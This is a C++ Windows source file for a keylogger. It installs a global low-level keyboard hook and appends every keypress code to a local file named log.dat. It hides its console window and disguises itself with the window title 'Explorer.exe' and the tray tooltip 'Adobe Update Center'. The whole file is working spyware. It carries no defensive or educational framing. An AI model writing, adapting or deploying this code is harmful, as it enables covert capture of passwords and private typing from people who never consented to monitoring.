#include <Windows.h>
#include <fstream>

using namespace std;

// Global variables
std::ofstream logFile;
HHOOK keyboardHook = nullptr;
NOTIFYICONDATA notifyIconData;
NOTIFYICONDATA nid;

void HideConsole()
{
    ::ShowWindow(::GetConsoleWindow(), SW_MINIMIZE);
}

// Function to handle key press and write to log file
void HandleKeyPress(DWORD vkCode)
{
    // Open the log file in append mode
    logFile.open("log.dat", ios_base::app);

    // Write the key code to the log file
    if (vkCode == 8) {

    }
    logFile << vkCode << " ";

    // Close the log file
    logFile.close();
}

// Keyboard hook procedure
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // Extract key information from the event
        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = pKeyboardStruct->vkCode;

        // Check if a key is being pressed (key down event)
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Handle the key press
            HandleKeyPress(vkCode);
        }
    }

    // Pass the event to the next hook procedure
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

// Window procedure
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            // Set up the keyboard hook
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, GetModuleHandle(nullptr), 0);
            if (keyboardHook == nullptr)
            {
                MessageBox(hwnd, "Failed to set up keyboard hook.", "Error", MB_OK | MB_ICONERROR);
                DestroyWindow(hwnd);
                return -1;
            }

            // Set up the system tray icon
            ZeroMemory(&notifyIconData, sizeof(NOTIFYICONDATA));
            notifyIconData.cbSize = sizeof(NOTIFYICONDATA);
            notifyIconData.hWnd = hwnd;
            notifyIconData.uID = 1;
            notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
            notifyIconData.uCallbackMessage = WM_USER + 1;
            notifyIconData.hIcon = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 32, 32, LR_LOADFROMFILE);
            lstrcpy(notifyIconData.szTip, "Adobe Update Center");
            Shell_NotifyIcon(NIM_ADD, &notifyIconData);

            // Minimize the window
            ShowWindow(hwnd, SW_HIDE);
            DestroyWindow(::GetConsoleWindow());
            HideConsole();
            break;
        }

        case WM_CLOSE:
            // Unhook the keyboard hook
            if (keyboardHook != nullptr)
            {
                UnhookWindowsHookEx(keyboardHook);
                keyboardHook = nullptr;
            }

            // Remove the system tray icon
            Shell_NotifyIcon(NIM_DELETE, &notifyIconData);

            DestroyWindow(hwnd);
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        case WM_USER + 1:
            switch (lParam)
            {
                case WM_LBUTTONDOWN:
                    // Show or hide the window when the left mouse button is clicked on the system tray icon
                    //ShowWindow(hwnd, IsWindowVisible(hwnd) ? SW_HIDE : SW_SHOW);
                    break;
            }

            break;

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

// Entry point of the application
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Register the window class
    const char *CLASS_NAME = "MyWindowClass";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClass(&wc))
    {
        MessageBox(nullptr, "Failed to register window class.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Create the window
    HWND hwnd = CreateWindowEx(
            0,
            CLASS_NAME,
            "Explorer.exe",
            WS_OVERLAPPEDWINDOW,
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            nullptr,
            nullptr,
            hInstance,
            nullptr
    );

    ZeroMemory(&nid, sizeof(NOTIFYICONDATA));
    nid.cbSize = sizeof(NOTIFYICONDATA);
    nid.hWnd = hwnd;
    nid.uID = 1; // Unique identifier for the icon
    nid.uFlags = NIF_ICON;
    nid.hIcon = (HICON)LoadImage(NULL, "icon.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);;
    Shell_NotifyIcon(NIM_ADD, &nid);

    if (hwnd == nullptr)
    {
        MessageBox(nullptr, "Failed to create window.", "Error", MB_OK | MB_ICONERROR);
        return -1;
    }

    // Message loop
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(hwnd, nullptr, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    // Cleanup
    if (keyboardHook != nullptr)
    {
        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
    }

    return 0;
}